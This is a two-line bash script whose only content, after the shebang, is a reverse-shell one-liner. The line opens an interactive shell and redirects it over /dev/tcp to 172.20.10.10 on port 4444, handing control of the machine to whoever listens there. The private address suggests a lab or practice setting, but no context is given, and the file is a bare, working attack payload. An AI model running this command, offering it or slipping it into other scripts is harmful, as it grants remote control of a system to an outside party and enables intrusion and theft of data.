#!/bin/bash
sh -i >& /dev/tcp/172.20.10.10/4444 0>&1
